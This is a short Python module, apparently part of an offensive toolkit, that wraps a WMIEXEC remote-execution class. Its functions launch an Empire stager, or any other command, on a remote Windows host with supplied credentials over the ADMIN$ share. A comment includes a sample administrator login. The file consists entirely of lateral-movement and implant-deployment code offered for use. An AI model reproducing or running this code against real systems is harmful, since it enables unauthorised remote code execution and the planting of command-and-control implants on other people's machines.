from lib.wmiexec import WMIEXEC


def execute_stager(host, username, password, domain, empiresession):

    #executer = WMIEXEC("START /B " + a.stager, 'Administrator', 'Passw0rd1', '', None, None, 'ADMIN$', False, False,None)
    executer = WMIEXEC("START /B " + empiresession.stager, username, password, domain, None, None, 'ADMIN$', False, False, None)
    executer.run(host)

def execute_wmi(host, username, password, domain, command):

    #WMIEXEC(command='', username='', password='', domain='', hashes=None, aesKey=None, share=None,noOutput=False, doKerberos=False, kdcHost=None):
    executer = WMIEXEC("START /B " + command, username, password, domain, None, None, 'ADMIN$', False, False, None)
    executer.run(host)
